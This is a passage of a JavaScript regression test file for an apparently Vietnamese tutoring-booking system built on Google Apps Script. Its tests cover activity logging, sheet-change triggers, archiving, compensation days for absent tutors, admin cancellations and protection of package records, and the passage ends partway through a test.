t('I109', 'Soát 5I vòng 1 (hồi quy): bỏ dòng không biến chữ "=..." thành công thức (A1); đổi cấu trúc tab ghi SHEET_CHANGE (A2); khoá bận thì nhật ký vào hàng chờ rồi ghi bù (A3); job theo giờ ghi SYSTEM (A8); PURGE_RECOVERED của ACTIVITY_LOG không mất (A10); METRICS không ghi đè cột admin thêm (A15); nhật ký quá hạn chuyển ngay (A16, đổi 5K)', () => {
  const c = mk(), { api, env } = c;
  // A1: cột không phải chữ (NOTIFICATIONS.entity_id) giữ chữ "=1+1" khi bỏ dòng; vòng 2 N4: cột admin tự thêm cũng vậy
  const nid = 'N' + Date.now() % 1000000;
  api.withLock_(() => { const t = api.table_('NOTIFICATIONS'); t.insert({ notif_id: 'N9000001', time: api.getNow_(), level: 'INFO', event: 'BOOKED', channel: 'LOG', entity: 'X', entity_id: '=1+1', message: 'giữ', read: true });
    t.insert({ notif_id: 'N9000002', time: api.getNow_(), level: 'INFO', event: 'BOOKED', channel: 'LOG', entity: 'X', entity_id: 'x', message: 'DROPME', read: true }); });
  const nsh = env.state.spreadsheets[Object.keys(env.state.spreadsheets).find(k => env.state.spreadsheets[k].sheets.NOTIFICATIONS)].sheets.NOTIFICATIONS;
  const wN = nsh.values[0].length; nsh.values[0][wN] = 'ghi_chu_admin';
  const rN = nsh.values.findIndex(r => r[0] === 'N9000001'); nsh.values[rN][wN] = '=gọi lại sau'; if (!nsh.values[rN]._lit) Object.defineProperty(nsh.values[rN], '_lit', { value: {}, writable: true, enumerable: false }); nsh.values[rN]._lit[wN] = true;
  env.state.formulaWrites = [];
  api.withLock_(() => api.purgeRows_('NOTIFICATIONS', o => o.message !== 'DROPME'));
  assert.deepStrictEqual(env.state.formulaWrites.filter(w => w.value === '=1+1' || w.value === '=gọi lại sau'), [], 'purgeRows_ ghi lại chữ thành công thức: ' + JSON.stringify(env.state.formulaWrites));
  api.clearDbCache_();
  assert.ok(c.rows('NOTIFICATIONS').some(l => l.notif_id === 'N9000001' && l.entity_id === '=1+1'));
  assert.ok(!c.rows('NOTIFICATIONS').some(l => l.message === 'DROPME'));
  assert.ok(nsh.values.some(r => r[wN] === '=gọi lại sau'), 'cột admin giữ nguyên chữ');
  api.withLock_(() => { api.logActivity_('TEST', 'KEEP', 'E', '2026-10', ''); });
  assert.strictEqual(c.rows('ACTIVITY_LOG').filter(l => l.action === 'KEEP').pop().entity_id, '2026-10', 'mã dạng tháng vẫn là chữ');
  // A2
  env.state.activeUserEmail = env.state.effectiveUserEmail;
  const src = { getActiveSheet: () => ({ getName: () => 'BOOKINGS', getActiveRange: () => ({ getRow: () => 5, getColumn: () => 1, getNumRows: () => 2, getNumColumns: () => 26 }) }) };
  assert.strictEqual(api.onChangeInstallable({ changeType: 'REMOVE_ROW', source: src, user: { getEmail: () => 'karn@thaiput.vn' } }), true);
  const sc = c.rows('ACTIVITY_LOG').filter(l => l.action === 'SHEET_CHANGE').pop();
  assert.ok(sc && sc.entity === 'BOOKINGS' && sc.detail === 'REMOVE_ROW A5:Z6' && sc.actor === 'karn@thaiput.vn', JSON.stringify(sc));
  const nSc = c.rows('ACTIVITY_LOG').length;
  assert.strictEqual(api.onChangeInstallable({ changeType: 'FORMAT', source: src }), null);
  assert.strictEqual(c.rows('ACTIVITY_LOG').length, nSc, 'đổi định dạng không ghi');
  // A3
  env.state.lockBusy = true;
  api.logMenu_({ user: { getEmail: () => 'karn@thaiput.vn' } }, 'MAIL_PREVIEW', 'MAIL', 'Q1', '');
  env.state.lockBusy = false; api.clearDbCache_();
  assert.ok(!c.rows('ACTIVITY_LOG').some(l => l.entity_id === 'Q1'), 'khoá bận: chưa ghi');
  api.logMenu_({ user: { getEmail: () => 'karn@thaiput.vn' } }, 'MAIL_PREVIEW', 'MAIL', 'Q2', '');
  const q = c.rows('ACTIVITY_LOG').filter(l => l.entity_id === 'Q1' || l.entity_id === 'Q2').map(l => l.entity_id);
  assert.deepStrictEqual(q, ['Q1', 'Q2'], 'dòng chờ ghi bù trước dòng mới');
  env.state.lockBusy = true; api.logMenu_({}, 'MAIL_PREVIEW', 'MAIL', 'Q3', ''); env.state.lockBusy = false;
  api.drainLogQueueNow_(); api.clearDbCache_();
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.entity_id === 'Q3'), 'job mỗi giờ ghi bù');
  assert.strictEqual(Object.keys(env.state.props).filter(k => /^LOGQ_/.test(k)).length, 0, 'ghi xong thì xoá hàng chờ');
  api.drainLogQueueNow_(); api.clearDbCache_();
  assert.strictEqual(c.rows('ACTIVITY_LOG').filter(l => l.entity_id === 'Q3').length, 1, 'không ghi bù lần hai');
  // Soát vòng 2 N1: Google từ chối lệnh ghi thì dòng đã rút khỏi hàng chờ không mất; dòng hiện tại không đưa lại (tránh trùng)
  env.state.lockBusy = true; api.logMenu_({}, 'MAIL_PREVIEW', 'MAIL', 'Q4', ''); env.state.lockBusy = false;
  env.state.failSetValuesOnce = 'ACTIVITY_LOG';
  assert.strictEqual(api.logMenu_({}, 'MAIL_PREVIEW', 'MAIL', 'Q5', ''), false);
  api.clearDbCache_();
  assert.ok(!c.rows('ACTIVITY_LOG').some(l => l.entity_id === 'Q4'));
  api.logMenu_({}, 'MAIL_PREVIEW', 'MAIL', 'Q6', ''); api.clearDbCache_();
  assert.deepStrictEqual(c.rows('ACTIVITY_LOG').filter(l => /^Q[456]$/.test(l.entity_id)).map(l => l.entity_id), ['Q4', 'Q6'], 'Q4 không mất');
  // Dòng chi tiết dài: hàng chờ cắt chi tiết, không vượt giới hạn 9KB mỗi giá trị
  env.state.lockBusy = true; api.logMenu_({}, 'SHEET_EDIT', 'USERS', 'Q7', 'x'.repeat(20000)); env.state.lockBusy = false;
  const qk = Object.keys(env.state.props).filter(k => /^LOGQ_/.test(k));
  assert.ok(qk.length === 1 && env.state.props[qk[0]].length < 9000, 'hàng chờ cắt chi tiết');
  api.drainLogQueueNow_(); api.clearDbCache_();
  // Trần hàng chờ: Script Properties tổng 500KB; quá LOG_Q_MAX_ dòng thì bỏ dòng mới (ghi Logger), không làm hỏng kho thuộc tính
  env.state.lockBusy = true; for (let i = 0; i < 155; i++) api.logMenu_({}, 'MAIL_PREVIEW', 'MAIL', 'QX' + i, 'y'.repeat(1400)); env.state.lockBusy = false;
  assert.strictEqual(Object.keys(env.state.props).filter(k => /^LOGQ_/.test(k)).length, 150, 'hàng chờ dừng ở trần');
  api.drainLogQueueNow_(); api.clearDbCache_();
  // A8
  api.createTriggers_();
  assert.ok(env.state.triggers.some(x => x.onChange && x.fn === 'onChangeInstallable'), 'menu tạo trigger onChange');
  const tt = env.state.triggers.find(x => !x.onEdit && !x.onChange);
  api.logMenu_({ triggerUid: tt.uid }, 'BACKUP_DONE', 'DRIVE', 'B1', '');
  assert.strictEqual(c.rows('ACTIVITY_LOG').filter(l => l.entity_id === 'B1').pop().actor, 'SYSTEM');
  api.logMenu_({ user: { getEmail: () => 'karn@thaiput.vn' } }, 'BACKUP_DONE', 'DRIVE', 'B2', '');
  assert.strictEqual(c.rows('ACTIVITY_LOG').filter(l => l.entity_id === 'B2').pop().actor, 'karn@thaiput.vn');
  // A10: mốc PURGE_OPEN_ACTIVITY_LOG kiểu "chưa ghi" thì dòng PURGE_RECOVERED vẫn còn sau purgeRows_
  api.withLock_(() => { const sh = api.dbSpreadsheet_().getSheetByName('ACTIVITY_LOG'), last = sh.getLastRow(), w = sh.getLastColumn();
    env.state.props['PURGE_OPEN_ACTIVITY_LOG'] = JSON.stringify({ keep: last - 1, last: last, width: w, all: api.purgeHash_(sh.getRange(2, 1, last - 1, w).getValues()), kept: 'x', tail: 'y' }); });
  api.withLock_(() => { api.logActivity_('TEST', 'DROPME', 'E', 'y', ''); }); 
  api.withLock_(() => { api.purgeRows_('ACTIVITY_LOG', o => o.action !== 'DROPME'); api.logActivity_('TEST', 'AFTER', 'E', 'z', ''); });
  api.clearDbCache_();
  const al = c.rows('ACTIVITY_LOG');
  assert.ok(al.some(l => l.action === 'PURGE_RECOVERED'), 'mất dòng PURGE_RECOVERED');
  assert.ok(!env.state.props['PURGE_OPEN_ACTIVITY_LOG']);
  const shv = env.state.spreadsheets[env.state.props.DB_ID_STAGING || 'DB_STAGING_TEST'].sheets.ACTIVITY_LOG.values;
  const lastIdx = shv.reduce((m, r, i) => (r.some(v => v !== '' && v !== undefined) ? i : m), 0);
  assert.ok(shv.slice(1, lastIdx + 1).every(r => r.some(v => v !== '' && v !== undefined)), 'không để hàng trống giữa tab');
  // A15: cột admin tự thêm bên phải METRICS (ví dụ ARRAYFORMULA) không bị ghi ô trống đè (Google: ghi đè vùng tràn làm công thức báo #REF!)
  const dbId = Object.keys(env.state.spreadsheets).find(k => env.state.spreadsheets[k].sheets.METRICS);
  const msh = env.state.spreadsheets[dbId].sheets.METRICS;
  const w = msh.values[0].length; msh.values[0][w] = 'ghi_chu_admin';
  api.withLock_(() => api.appendRowsRaw_('METRICS', [{ time: api.getNow_(), fn: 'x', ms: 1 }]));
  const lastM = msh.values[msh.values.length - 1];
  assert.ok(lastM.some(v => v === 'x') && lastM[w] === undefined, 'appendRowsRaw_ ghi đè cột admin thêm: ' + JSON.stringify(lastM));
  // A16
  api.withLock_(() => api.table_('ACTIVITY_LOG').insert({ time: new Date(2026, 7, 10), actor: 'x', action: 'OLD_A', entity: 'E', entity_id: '1', detail: '' }));
  api.clearDbCache_();
  // 5K (anh chốt 01/11): bỏ mốc chờ 7 ngày: dòng vừa quá hạn chuyển ngay
  const r1 = api.withLock_(() => api.archiveTabInLock_('ACTIVITY_LOG', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000, false));
  assert.ok(r1.archived >= 1, JSON.stringify(r1));
  api.withLock_(() => api.table_('ACTIVITY_LOG').insert({ time: new Date(2026, 7, 1), actor: 'x', action: 'OLD_B', entity: 'E', entity_id: '2', detail: '' }));
  api.clearDbCache_();
  const r2 = api.withLock_(() => api.archiveTabInLock_('ACTIVITY_LOG', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000, false));
  assert.ok(r2.archived >= 1, JSON.stringify(r2));
  api.clearDbCache_();
  assert.ok(!c.rows('ACTIVITY_LOG').some(l => l.action === 'OLD_A' || l.action === 'OLD_B'));
  // Vòng 2 N2: hơn 300 dòng cùng một mốc giờ (STAGING giả lập giờ) vẫn xem hết, không lặp; dòng giống hệt nhau không mất
  const tSame = new Date(2026, 9, 14, 9, 0, 0), rowsSame = [];
  for (let i = 0; i < 450; i++) rowsSame.push({ time: tSame, actor: 'SYSTEM', action: 'BOOKED', entity: 'BOOKING', entity_id: 'BK' + (i % 400), detail: '' });
  rowsSame.push({ time: new Date(2026, 9, 13, 9, 0, 0), actor: 'SYSTEM', action: 'BOOKED', entity: 'BOOKING', entity_id: 'YESTERDAY', detail: '' });
  api.withLock_(() => { const t = api.table_('ACTIVITY_LOG'); rowsSame.forEach(r => t.insert(r)); }); api.clearDbCache_();
  const atk = tokenFor(c, 'A01'); let cur = null, got = [], loops = 0;
  do { const r = api.apiAdminLog(atk, { who: 'system', text: 'BK', limit: 100, cursor: cur }).data; got = got.concat(r.items); cur = r.next; loops++; } while (cur && loops < 20);
  assert.strictEqual(got.length, 450, 'xem hết 450 dòng cùng mốc: ' + got.length + ' sau ' + loops + ' lần');
  cur = null; got = []; loops = 0;
  do { const r = api.apiAdminLog(atk, { who: 'system', limit: 120, cursor: cur }).data; got = got.concat(r.items); cur = r.next; loops++; } while (cur && loops < 30);
  assert.ok(got.some(x => x.entityId === 'YESTERDAY'), 'tới được dòng hôm qua');
  // Mở đúng dòng: hai dòng cùng giờ, cùng hành động, khác nội dung, tab đã dời hàng
  const pick = got.find(x => x.entityId === 'BK7');
  const e1 = api.apiAdminLogEntry(atk, 99999, pick.ts, pick.action, pick.h);
  assert.ok(e1.ok && e1.data.entityId === 'BK7', 'mở đúng dòng theo mã băm: ' + JSON.stringify(e1.data && e1.data.entityId));
});

t('I110', 'Soát 5I vòng 2 (hồi quy): trigger đổi cấu trúc biết đúng tab bị thêm, xoá, đổi tên (N3), tab hệ thống bị đổi tên thì báo Khẩn; sửa ô (EDIT) bỏ ngay không kiểm quyền (N7); thông báo đặt buổi ghi ngày theo thứ (N9 giao diện); chi tiết nhật ký dạng JSON (N8)', () => {
  const c = mk(), { api, env } = c;
  const ssApi = env.globals.SpreadsheetApp.openById('DB_STAGING_TEST'), ss = env.state.spreadsheets['DB_STAGING_TEST'];
  env.state.activeUserEmail = env.state.effectiveUserEmail;
  api.createTriggers_(ssApi);
  assert.ok(env.state.props.SHEET_SNAP && JSON.parse(env.state.props.SHEET_SNAP).BOOKINGS === 'BOOKINGS', 'lưu danh sách tab khi tạo trigger');
  const ev = (type) => ({ changeType: type, source: ssApi, user: { getEmail: () => 'karn@thaiput.vn' } });
  ssApi.insertSheet('TAB_X');
  assert.strictEqual(api.onChangeInstallable(ev('INSERT_GRID')), true);
  let l = c.rows('ACTIVITY_LOG').filter(x => x.action === 'SHEET_CHANGE').pop();
  assert.ok(l.entity === 'TAB_X' && JSON.parse(l.detail).added[0] === 'TAB_X', JSON.stringify(l));
  const n0 = c.rows('NOTIFICATIONS').filter(x => x.event === 'SHEET_REMOVED').length;
  ssApi.getSheetByName('BOOKINGS').setName('BOOKINGS_CU');
  api.onChangeInstallable(ev('OTHER'));
  l = c.rows('ACTIVITY_LOG').filter(x => x.action === 'SHEET_CHANGE').pop();
  assert.deepStrictEqual(JSON.parse(l.detail).renamed, [['BOOKINGS', 'BOOKINGS_CU']], l.detail);
  const nr = c.rows('NOTIFICATIONS').filter(x => x.event === 'SHEET_REMOVED');
  assert.ok(nr.length === n0 + 1 && nr.pop().level === 'CRITICAL', 'tab hệ thống đổi tên: báo Khẩn');
  ssApi.getSheetByName('BOOKINGS_CU').setName('BOOKINGS'); api.onChangeInstallable(ev('OTHER'));
  delete ss.sheets.TAB_X;
  api.onChangeInstallable(ev('REMOVE_GRID'));
  l = c.rows('ACTIVITY_LOG').filter(x => x.action === 'SHEET_CHANGE').pop();
  assert.ok(l.entity === 'TAB_X' && JSON.parse(l.detail).removed[0] === 'TAB_X', 'tab vừa xoá ghi đúng tên: ' + JSON.stringify(l));
  assert.strictEqual(c.rows('NOTIFICATIONS').filter(x => x.event === 'SHEET_REMOVED').length, n0 + 1, 'tab ngoài hệ thống bị xoá: không báo');
  assert.deepStrictEqual(api.sheetDiff_({ 1: 'A', 2: 'B' }, { 1: 'A', 3: 'C' }, 'OTHER'), { added: [], removed: [], renamed: [['B', 'C']] });
  // N7: EDIT, FORMAT bỏ ngay kể cả khi người gọi không có quyền (không gọi dịch vụ nào)
  env.state.activeUserEmail = '';
  assert.strictEqual(api.onChangeInstallable({ changeType: 'EDIT' }), null);
  assert.throws(() => api.onChangeInstallable({ changeType: 'REMOVE_ROW' }), /Không có quyền/);
  env.state.activeUserEmail = env.state.effectiveUserEmail;
  // N9 giao diện: thông báo đặt buổi ghi ngày theo thứ ở cả hai thứ tiếng
  c.at('2026-10-13 10:00'); c.book('S003', [['2026-10-15', '19:00']]);
  const bn = c.rows('NOTIFICATIONS').filter(x => x.event === 'BOOKED').pop();
  assert.ok(/Thứ 5 15\/10 19:00/.test(bn.message) && /Thu 15\/10 19:00/.test(bn.message_en) && !/2026-10-15/.test(bn.message), bn.message + ' | ' + bn.message_en);
  // N8: chi tiết nhật ký cũ đổi sang JSON
  const fsrc = require('fs').readFileSync(require('path').join(__dirname, '..', 'src', 'Archive.gs'), 'utf8') + require('fs').readFileSync(require('path').join(__dirname, '..', 'src', 'Db.gs'), 'utf8');
  assert.ok(!/bỏ ' \+ redo \+ ' dòng|dọn ' \+ cleared/.test(fsrc));
});

// ══ Chunk 5M: bù buổi, khoá ngày bắt đầu, bảo vệ STUDENT_PACKAGES ══
const pickAdmin = (c, id, v, at) => { const { api } = c; api.withLock_(() => api.table_('BOOKINGS').update(api.table_('BOOKINGS').byId(id), { admin_action: v })); return api.handleAdminEdit_('BOOKINGS', 'admin_action', id, v, 'admin@thaiput.vn', at ? { at: at } : undefined); };

t('I111', '5M luồng thật: Trial khoá ngày bắt đầu khi tutor xác nhận Hoàn thành; Vắng tutor cộng +3 ngày một lần, có email COMP_EXTENDED và thông báo; Vắng tutor chỉ sau giờ học, ghi đè buổi đã có kết quả phải chọn lại lần hai; Đổi tutor bị chặn sau giờ học', () => {
  const c = mk('2026-10-12 10:00'), { api } = c;
  ['14', '16', '19'].forEach(d => c.onlyOpen('2026-10-' + d, '19:00', ['T001']));
  const r = c.book('S001', [['2026-10-14', '19:00'], ['2026-10-16', '19:00']]);
  assert.ok(r.every(x => x.ok), JSON.stringify(r));
  let sp = c.sp('SP00001');
  assert.strictEqual(sp.start_source + '|' + c.keyOf(sp.start_date), 'BOOKING|2026-10-14', 'trước buổi đầu: tạm tính');
  assert.ok(c.summary('S001')[0].startPending);
  c.at('2026-10-14 19:40');
  assert.ok(api.submitSessionResultFor_('T001', r[0].bookingId, 'COMPLETED', EMAIL.T001).ok);
  sp = c.sp('SP00001');
  assert.strictEqual([sp.start_source, c.keyOf(sp.start_date_locked), sp.start_booking_id, c.keyOf(sp.end_date)].join('|'), 'LOCKED|2026-10-14|' + r[0].bookingId + '|2026-10-20');
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'PACKAGE_START_LOCKED' && l.entity_id === 'SP00001'));
  // Vắng tutor trước giờ học: không cho
  c.at('2026-10-16 10:00');
  assert.strictEqual(pickAdmin(c, r[1].bookingId, 'Vắng tutor').ok, false);
  assert.strictEqual(c.row('BOOKINGS', r[1].bookingId).status, 'CONFIRMED');
  c.at('2026-10-16 21:00');
  assert.strictEqual(pickAdmin(c, r[1].bookingId, 'Đổi tutor').ok, false, 'Đổi tutor sau giờ học bị chặn');
  assert.ok(/Lỗi: Đổi tutor \(Buổi học đã bắt đầu/.test(c.row('BOOKINGS', r[1].bookingId).admin_note));
  assert.ok(pickAdmin(c, r[1].bookingId, 'Vắng tutor').ok);
  sp = c.sp('SP00001');
  assert.strictEqual(c.keyOf(sp.end_date) + '|' + sp.comp_days, '2026-10-23|3', 'Trial +3, F = 18/10 không cần phần thêm');
  assert.strictEqual(c.row('BOOKINGS', r[1].bookingId).comp_days, 3);
  const mail = c.mailsTo(EMAIL.S001).filter(m => /cộng 3 ngày/.test(m.subject));
  assert.strictEqual(mail.length, 1, 'đúng 1 email COMP_EXTENDED');
  assert.ok(/tutor vắng/.test(mail[0].htmlBody) && /the tutor was absent/.test(mail[0].htmlBody) && /23\/10\/2026/.test(mail[0].htmlBody) && mail[0].htmlBody.indexOf('Vân') === -1, 'có lý do, hạn mới, không nêu tên tutor');
  assert.ok(c.rows('NOTIFICATIONS').some(n => n.event === 'COMP_EXTENDED' && n.entity_id === 'SP00001'));
  assert.strictEqual(c.summary('S001')[0].compDays + '|' + c.summary('S001')[0].sessionsLeft, '3|1');
  // Chọn lại lần nữa trên buổi đã Vắng tutor: không cộng thêm
  pickAdmin(c, r[1].bookingId, 'Vắng tutor');
  assert.strictEqual(c.sp('SP00001').comp_days, 3);
  // Ghi đè buổi Hoàn thành (buổi làm mốc): lần đầu chỉ hỏi lại; lần hai trong 10 phút thì ghi. Ngày bắt đầu giữ, Trial hết lần cộng ngày.
  c.at('2026-10-16 21:05');
  const first = pickAdmin(c, r[0].bookingId, 'Vắng tutor');
  assert.ok(!first.ok && /Chọn lại/.test(first.message));
  assert.strictEqual(c.row('BOOKINGS', r[0].bookingId).status, 'COMPLETED');
  assert.ok(/^Chờ xác nhận/.test(c.row('BOOKINGS', r[0].bookingId).admin_note));
  c.at('2026-10-16 21:08');
  assert.ok(pickAdmin(c, r[0].bookingId, 'Vắng tutor').ok);
  sp = c.sp('SP00001');
  assert.strictEqual([c.row('BOOKINGS', r[0].bookingId).status, c.keyOf(sp.start_date), c.keyOf(sp.end_date), c.row('BOOKINGS', r[0].bookingId).comp_days].join('|'), 'TUTOR_ABSENT|2026-10-14|2026-10-23|0');
  assert.strictEqual(c.summary('S001')[0].sessionsLeft, 2, 'cả hai buổi tutor vắng: trả đủ 2 lượt');
  const rep = api.computeMonthReport_(2026, 10);
  assert.strictEqual(rep.tutors.T001.COMPLETED + '|' + rep.tutors.T001.TUTOR_ABSENT, '0|2', 'tutor mất lương buổi bị ghi đè');
});

t('I112', '5M: Huỷ bởi admin xét giờ chọn ô (14:59:50 là trước hạn, 15:00 là muộn); 3 lựa chọn lỗi kỹ thuật đổi qua lại khớp lương, lượt, ngày; buổi đổi tutor không còn ai thì huỷ và bù', () => {
  const c = mk('2026-10-12 10:00'), { api } = c;
  c.onlyOpen('2026-10-15', '19:00', ['T001']); c.onlyOpen('2026-10-16', '19:00', ['T001']);
  const [a] = c.book('S001', [['2026-10-15', '19:00']]);
  const [b] = c.book('S002', [['2026-10-16', '19:00']]);
  c.at('2026-10-14 15:00:03');
  assert.ok(pickAdmin(c, a.bookingId, 'Huỷ bởi admin', new Date(2026, 9, 14, 14, 59, 50)).ok);
  assert.strictEqual(c.row('BOOKINGS', a.bookingId).status, 'CANCELLED_ADMIN', 'chọn 14:59:50, khoá chạy 15:00:03: trước hạn');
  assert.strictEqual(c.sp('SP00001').status, 'INACTIVE', 'huỷ trước hạn: ngày bắt đầu lùi (gói về chưa kích hoạt)');
  c.at('2026-10-15 15:00');
  const late = pickAdmin(c, b.bookingId, 'Huỷ bởi admin');
  assert.ok(late.ok && /Huỷ muộn/.test(late.message));
  assert.strictEqual(c.row('BOOKINGS', b.bookingId).status, 'CANCELLED_LATE');
  const sp2 = c.sp('SP00002');
  assert.strictEqual([sp2.status, sp2.start_source, c.keyOf(sp2.start_date), c.keyOf(sp2.end_date)].join('|'), 'ACTIVE|LOCKED|2026-10-16|2026-10-29', 'huỷ muộn khoá ngày bắt đầu (BL40 a), không cộng ngày (BL46)');
  assert.ok(c.mailsTo(EMAIL.S002).some(m => m.subject.indexOf('Huỷ buổi') === 0));
  // Buổi kỹ thuật của S003 (gói 1 tháng cố định 05/10 đến 03/11)
  c.at('2026-10-12 10:00'); c.onlyOpen('2026-10-14', '19:00', ['T001']);
  const [t1] = c.book('S003', [['2026-10-14', '19:00']]);
  c.at('2026-10-14 19:40');
  assert.ok(api.submitSessionResultFor_('T001', t1.bookingId, 'TECH_ISSUE', EMAIL.T001).ok);
  const st = () => { const bk = c.row('BOOKINGS', t1.bookingId), sp = c.sp('SP00003'), rep = api.computeMonthReport_(2026, 10).tutors.T001; return [bk.tech_fault, c.keyOf(sp.end_date), rep.TECH_PAID + '/' + rep.TECH_UNPAID].join('|'); };
  assert.strictEqual(st(), 'TUTOR|2026-11-04|0/1', 'mặc định lỗi tutor: bù 1 ngày, không lương');
  c.at('2026-10-15 09:00');
  assert.ok(pickAdmin(c, t1.bookingId, 'Tính lương buổi kỹ thuật').ok);
  assert.strictEqual(st(), 'STUDENT|2026-11-03|1/0', 'lỗi học viên: rút ngày bù, có lương');
  assert.ok(pickAdmin(c, t1.bookingId, 'Lỗi khách quan: tính lương và bù').ok);
  assert.strictEqual(st(), 'OBJECTIVE|2026-11-04|1/0');
  assert.ok(pickAdmin(c, t1.bookingId, 'Không tính lương buổi kỹ thuật').ok);
  assert.strictEqual(st(), 'TUTOR|2026-11-04|0/1');
  assert.ok(c.row('BOOKINGS', t1.bookingId).tech_decided_at instanceof Date);
  // Đổi tutor mà không còn ai trống: huỷ CANCELLED_TUTOR và bù (S005 gói cố định 01/10 đến 30/10)
  c.at('2026-10-12 10:00'); c.onlyOpen('2026-10-20', '19:00', ['T001']);
  const [m] = c.book('S005', [['2026-10-20', '19:00']]);
  c.at('2026-10-19 20:00');
  assert.ok(pickAdmin(c, m.bookingId, 'Đổi tutor').ok);
  assert.strictEqual(c.row('BOOKINGS', m.bookingId).status + '|' + c.keyOf(c.sp('SP00005').end_date), 'CANCELLED_TUTOR|2026-10-31');
});

t('I113', '5M: bảo vệ STUDENT_PACKAGES: sửa ô hệ thống bị trả lại, có nhật ký; admin sửa hạn thì phần chênh vào comp_days_admin, có email; người ngoài PKG_EDITORS bị trả lại; dán đè tự lành trong hourlyJob; xoá dòng gói báo Khẩn', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  const sheet = env.globals.SpreadsheetApp.openById('DB_STAGING_TEST').getSheetByName('STUDENT_PACKAGES');
  const sp = c.sp('SP00003'), col = n => api.SCHEMA.STUDENT_PACKAGES.cols.indexOf(n) + 1;
  const ev = (name, v, old, who) => { const rg = sheet.getRange(sp._row, col(name)); rg.setValue(v); return api.onEditInstallable({ range: rg, value: v instanceof Date ? undefined : v, oldValue: old, user: { getEmail: () => who || 'admin@thaiput.vn' } }); };
  const serial = d => String(Math.round((Date.UTC(d.getFullYear(), d.getMonth(), d.getDate()) - Date.UTC(1899, 11, 30)) / 86400000));   // Google gửi ô ngày dạng số ngày
  let res = ev('start_date', new Date(2026, 9, 1), serial(sp.start_date));
  assert.ok(res && !res.ok && /Không thể chỉnh sửa/.test(res.message), JSON.stringify(res));
  assert.strictEqual(c.keyOf(c.sp('SP00003').start_date), '2026-10-05', 'trả lại ngày bắt đầu');
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'PACKAGE_EDIT_DENIED' && l.entity_id === 'SP00003'));
  res = ev('status', 'EXPIRED', 'ACTIVE');
  assert.strictEqual(c.sp('SP00003').status, 'ACTIVE');
  res = ev('end_date', new Date(2026, 10, 10), '', 'other@gmail.com');
  assert.ok(!res.ok); assert.strictEqual(c.keyOf(c.sp('SP00003').end_date), '2026-11-03', 'người ngoài PKG_EDITORS: trả lại');
  res = ev('end_date', 'thứ hai', '');
  assert.ok(!res.ok); assert.strictEqual(c.keyOf(c.sp('SP00003').end_date), '2026-11-03', 'không phải ngày: trả lại');
  res = ev('end_date', new Date(2026, 10, 10), '');
  assert.ok(res.ok, res.message);
  let now = c.sp('SP00003');
  assert.strictEqual(c.keyOf(now.end_date) + '|' + now.comp_days_admin, '2026-11-10|7');
  assert.ok(c.mailsTo(EMAIL.S003).some(m => /Hạn gói/.test(m.subject) && /03\/11\/2026/.test(m.htmlBody) && /10\/11\/2026/.test(m.htmlBody)), 'email PACKAGE_DATES_CHANGED');
  res = ev('comp_days_admin', '2', '7');
  assert.ok(res.ok); assert.strictEqual(c.keyOf(c.sp('SP00003').end_date), '2026-11-05');
  // Dán đè (onEdit không bắt được): hourlyJob trả lại ngày đã khoá và báo admin
  const raw = env.state.spreadsheets.DB_STAGING_TEST.sheets.STUDENT_PACKAGES.values;
  raw[sp._row - 1][col('start_date') - 1] = new Date(2026, 8, 1);
  c.at('2026-10-12 11:05'); api.hourlyJob();
  assert.strictEqual(c.keyOf(c.sp('SP00003').start_date), '2026-10-05');
  assert.ok(c.rows('NOTIFICATIONS').some(n => n.event === 'PACKAGE_HEALED' && /SP00003/.test(n.entity_id)));
  // Xoá dòng gói đang có buổi: báo Khẩn một lần
  c.onlyOpen('2026-10-20', '19:00', ['T001']); c.book('S007', [['2026-10-20', '19:00']]);
  const row7 = c.sp('SP00007')._row;
  raw.splice(row7 - 1, 1);
  c.at('2026-10-12 12:05'); api.hourlyJob();
  c.at('2026-10-12 13:05'); api.hourlyJob();
  const miss = c.rows('NOTIFICATIONS').filter(n => n.event === 'PACKAGE_ROW_MISSING');
  assert.strictEqual(miss.length, 1); assert.strictEqual(miss[0].level, 'CRITICAL');
  assert.ok(c.mailsTo(EMAIL.ADMIN).some(m => /SP00007/.test(m.htmlBody)));
});

t('I114', '5M: gói vừa hết hạn tự mở lại khi buổi trong hạn được bù sau 06:00 hôm sau; tạm khoá qua ngày hết hạn không đóng gói; gói nối đuôi dời theo và buổi rơi vào khoảng mới chuyển sang gói trước', () => {
  const c = mk('2026-10-12 10:00'), { api } = c;
  // S007 PASS_2W cố định 12/10 đến 25/10; buổi 25/10 19:00
  c.onlyOpen('2026-10-25', '19:00', ['T001']);
  const [x] = c.book('S007', [['2026-10-25', '19:00']]);
  c.at('2026-10-26 06:00'); api.dailyJob();
  assert.strictEqual(c.sp('SP00007').status, 'EXPIRED');
  c.at('2026-10-26 08:00');
  assert.ok(pickAdmin(c, x.bookingId, 'Vắng tutor').ok);
  let sp = c.sp('SP00007');
  assert.strictEqual(sp.status + '|' + c.keyOf(sp.end_date), 'ACTIVE|2026-10-27', 'F = 27/10: hạn = 26/10 + 1, mở lại');
  assert.ok(c.mailsTo(EMAIL.S007).some(m => /cộng 2 ngày/.test(m.subject)));
  // Tạm khoá S005 (01/10 đến 30/10) qua ngày hết hạn
  c.at('2026-10-28 09:00'); api.suspendStudent_('S005', 'admin@thaiput.vn');
  c.at('2026-10-31 06:00'); api.dailyJob();
  assert.strictEqual(c.sp('SP00005').status, 'ACTIVE', 'đang tạm khoá: không hết hạn');
  c.at('2026-11-02 09:00'); api.unsuspendStudent_('S005', 'admin@thaiput.vn');
  assert.strictEqual(c.keyOf(c.sp('SP00005').end_date), '2026-11-04', 'cộng đủ 5 ngày tạm khoá');
  // Gói nối đuôi: S008 PASS_1M 05/10 đến 03/11, mua thêm gói 2 tuần (nối 04/11 đến 17/11), đặt buổi 04/11
  const c2 = mk('2026-10-12 10:00'), api2 = c2.api;
  const reg = api2.submitRegistration_(c2.form({ email: EMAIL.S008, name: 'S008', package_code: 'PASS_2W' }));
  assert.ok(api2.approveRegistration_(reg.regId, 'admin@thaiput.vn').ok);
  const q = c2.rows('STUDENT_PACKAGES').find(p => p.student_id === 'S008' && p.package_code === 'PASS_2W');
  assert.strictEqual(q.status + '|' + c2.keyOf(q.start_date) + '|' + c2.keyOf(q.start_date_locked), 'QUEUED|2026-11-04|2026-11-04');
